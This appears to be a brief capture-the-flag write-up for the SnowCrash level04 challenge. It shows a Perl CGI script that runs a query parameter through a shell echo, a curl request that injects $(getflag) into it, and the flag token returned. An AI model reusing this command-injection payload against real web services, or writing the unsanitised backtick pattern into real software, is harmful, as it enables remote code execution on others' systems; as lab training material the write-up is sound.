> level04@SnowCrash:~$ cat level04.pl
> #!/usr/bin/perl
> # localhost:4747
> use CGI qw{param};
> print "Content-type: text/html\n\n";
> sub x {
>   $y = $_[0];
>   print `echo $y 2>&1`;
> }
> x(param("x"));

It is exposing an http endpoint on localhost:4747 so we will use curl to request it
we can exploit `echo $y`

then execute
`curl http://localhost:4747/?x="\$(getflag)"

> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
